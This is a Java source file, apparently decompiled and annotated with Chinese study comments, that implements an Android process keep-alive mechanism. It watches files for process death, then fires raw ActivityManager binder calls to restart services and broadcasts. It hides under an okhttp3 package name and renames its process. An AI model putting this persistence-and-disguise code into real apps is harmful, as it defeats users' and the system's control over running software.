package okhttp3.internal.platform.inner;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;
import android.text.TextUtils;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import O00000Oo.O000000o.O000000o.O000000o.ALiveInfo;
import O00000Oo.O000000o.O000000o.O000000o.LogUtils;
import okhttp3.internal.platform.NetUtil;

public class PowerGemEntrance {
    /**
     * 启动服务需要的参数
     */
    public Parcel parcelStartService;
    public IBinder amsBinder;
    /**
     * 发送广播需要的参数
     */
    public Parcel parcelBroadCast;
    public int broadcastTransaction;
    /**
     * 这个，组件参数？？
     */
    public Parcel parcelInstrumentation;
    public ALiveInfo aLiveInfo;
    public int startInstrumentationTransaction;
    public int startServiceTransaction;

    public PowerGemEntrance(ALiveInfo bean) {
        this.aLiveInfo = bean;
    }

    public static void main(String[] args) {
        try {
            String encodeString = args[0];
            if (!TextUtils.isEmpty(encodeString)) {
                ALiveInfo bean = ALiveInfo.decode(encodeString);
                if (bean != null) {
                    //下面这行会阻塞线程,
                    // 监听文件，若成功说明进程挂掉了，所以kill了自己？
                    new PowerGemEntrance(bean).startWatch();
                    Process.killProcess(Process.myPid());
                }
            }
        } catch (Exception ignored) {
        }
    }

    /**
     * 模拟发送广播，利用ActivityManager的Binder向系统进程，请求发送广播
     */
    public final void broadcastIntent() {
        Parcel data = this.parcelBroadCast;
        if (data != null) {
            if (amsBinder != null) {
                try {
                    amsBinder.transact(this.broadcastTransaction, data, null, 1);
                } catch (Exception ignored) {
                }
            }
        }
    }

    public final void startWatch() {
        try {
            this.prepareBinder();
            int i;
            //watch 第二个
            for (i = 1; i < this.aLiveInfo.twoOtherFiles.length; ++i) {
                new ThreadWatch(i).start();
            }
            watchAndResume(0);
        } catch (Throwable e) {
            LogUtils.log(e.getMessage());
        }
    }

    /**
     * {@link okhttp3.internal.platform.PowerGem#moBuilder(Context)}
     *
     * @param index 观察第几个文件
     */
    private void watchAndResume(int index) {
        String path = aLiveInfo.twoOtherFiles[index];
        LogUtils.log("_____start watch:" + path);
        NetUtil.watch(path);
        LogUtils.log("_____end watch:" + path);
        // watch 结束，那么对方的进程挂了，赶忙启动服务，拉起来 但下面的三个 相关的intent，都是运行在主进程中。难道是拉取主进程？
        // 这里有两处调用，在两个线程中
        // 三种唤醒方式，增加成功率
        this.startInstrumentation();
        this.startService();
        this.broadcastIntent();
    }

    /**
     * 获取 ASM Binder。利用这个binder直接与系统进程通信，启动服务、发送广播等
     * 参考 ContextImpl#startService() 等，最后还是利用ASM 的Binder通信，只是封装了下。
     */
    public void prepareBinder() {
        try {
            Class classServiceManager = Class.forName("android.os.ServiceManager");
            Method methodGetService = classServiceManager.getMethod("getService", String.class);
            this.amsBinder = (IBinder) methodGetService.invoke(null, "activity");
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (Throwable e) {
            LogUtils.log(e.getMessage());
            throw e;
        }

        this.startServiceTransaction = this.getTransaction("TRANSACTION_startService", "START_SERVICE_TRANSACTION");
        this.broadcastTransaction = this.getTransaction("TRANSACTION_broadcastIntent", "BROADCAST_INTENT_TRANSACTION");
        this.startInstrumentationTransaction = this.getTransaction("TRANSACTION_startInstrumentation", "START_INSTRUMENTATION_TRANSACTION");
        if (this.startServiceTransaction == -1 && this.broadcastTransaction == -1 && this.startInstrumentationTransaction == -1) {
            throw new RuntimeException("all binder code get failed");
        }

        if (this.aLiveInfo.intentPowerExportService != null && this.aLiveInfo.intentPowerExportService.getComponent() != null) {
            Intent intent = this.aLiveInfo.intentPowerExportService;
            this.parcelStartService = Parcel.obtain();
            this.parcelStartService.writeInterfaceToken("android.app.IActivityManager");
            this.parcelStartService.writeStrongBinder(null);
            if (Build.VERSION.SDK_INT >= 26) {
                this.parcelStartService.writeInt(1);
            }

            intent.writeToParcel(this.parcelStartService, 0);
            this.parcelStartService.writeString(null);
            if (Build.VERSION.SDK_INT >= 26) {
                this.parcelStartService.writeInt(0);
            }

            if (Build.VERSION.SDK_INT > 22) {
                this.parcelStartService.writeString(intent.getComponent().getPackageName());
            }

            this.parcelStartService.writeInt(0);
        }

        if (this.aLiveInfo.intentPowerInstrumentation != null && this.aLiveInfo.intentPowerExportService.getComponent() != null) {
            ComponentName component = this.aLiveInfo.intentPowerInstrumentation.getComponent();
            if (component != null) {
                this.parcelInstrumentation = Parcel.obtain();
                this.parcelInstrumentation.writeInterfaceToken("android.app.IActivityManager");
                if (Build.VERSION.SDK_INT >= 26) {
                    this.parcelInstrumentation.writeInt(1);
                }
                // 将组件信息，写入到 Parcel 中，稍后，发送给系统，让系统启动
                component.writeToParcel(this.parcelInstrumentation, 0);
                this.parcelInstrumentation.writeString(null);
                this.parcelInstrumentation.writeInt(0);
                this.parcelInstrumentation.writeInt(0);
                this.parcelInstrumentation.writeStrongBinder(null);
                this.parcelInstrumentation.writeStrongBinder(null);
                this.parcelInstrumentation.writeInt(0);
                this.parcelInstrumentation.writeString(null);
            }
        }

        ALiveInfo aLiveInfo = this.aLiveInfo;
        if (aLiveInfo != null) {
            Intent intent = aLiveInfo.intentActionUpdateReceiver;
            if (intent != null) {
                intent.setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
                this.parcelBroadCast = Parcel.obtain();
                // 写入数据
                this.parcelBroadCast.writeInterfaceToken("android.app.IActivityManager");
                this.parcelBroadCast.writeStrongBinder(null);
                if (Build.VERSION.SDK_INT >= 26) {
                    this.parcelBroadCast.writeInt(1);
                }

                intent.writeToParcel(this.parcelBroadCast, 0);
                this.parcelBroadCast.writeString(null);
                this.parcelBroadCast.writeStrongBinder(null);
                this.parcelBroadCast.writeInt(-1);
                this.parcelBroadCast.writeString(null);
                this.parcelBroadCast.writeInt(0);
                this.parcelBroadCast.writeStringArray(null);
                this.parcelBroadCast.writeInt(-1);
                this.parcelBroadCast.writeInt(0);
                this.parcelBroadCast.writeInt(0);
                this.parcelBroadCast.writeInt(0);
                this.parcelBroadCast.writeInt(0);
            }
        }

        NetUtil.disconnect();
        try {
            Class v0_13 = Process.class;
            v0_13.getDeclaredMethod("setArgV0", String.class).invoke(null, this.aLiveInfo.currentProcessName);
        } catch (IllegalAccessException v0_12) {
            v0_12.printStackTrace();
        } catch (InvocationTargetException v0_11) {
            v0_11.printStackTrace();
        } catch (NoSuchMethodException v0_10) {
            v0_10.printStackTrace();
        }
    }

    public final void startInstrumentation() {
        Parcel data = this.parcelInstrumentation;
        if (data != null) {
            if (amsBinder != null) {
                try {
                    amsBinder.transact(this.startInstrumentationTransaction, data, null, 1);
                } catch (Exception unused_ex) {
                }
            }
        }
    }

    public final void startService() {
        Parcel data = this.parcelStartService;
        if (data != null) {
            if (amsBinder != null) {
                try {
                    amsBinder.transact(this.startServiceTransaction, data, null, 1);
                } catch (Exception unused_ex) {
                }
            }
        }
    }

    /**
     * android 版本不同实现方式不一样
     */
    public final int getTransaction(String arg3, String arg4) {
        try {
            // 9.0 https://java-browser.yawk.at/android/android-9.0.0_r35/android/app/IActivityManager.java#android.app.IActivityManager
            Class v0 = Class.forName("android.app.IActivityManager$Stub");
            Field v3 = v0.getDeclaredField(arg3);
            v3.setAccessible(true);
            return v3.getInt(v0);
        } catch (Exception unused_ex) {
            try {
                Class v3_1 = Class.forName("android.app.IActivityManager");
                Field v4 = v3_1.getDeclaredField(arg4);
                v4.setAccessible(true);
                return v4.getInt(v3_1);
            } catch (Exception ignored) {
                return -1;
            }
        }
    }

    public class ThreadWatch extends Thread {
        public final int index;

        public ThreadWatch(int index) {
            this.index = index;
        }

        @Override
        public void run() {
            this.setPriority(10);
            watchAndResume(this.index);
        }
    }
}

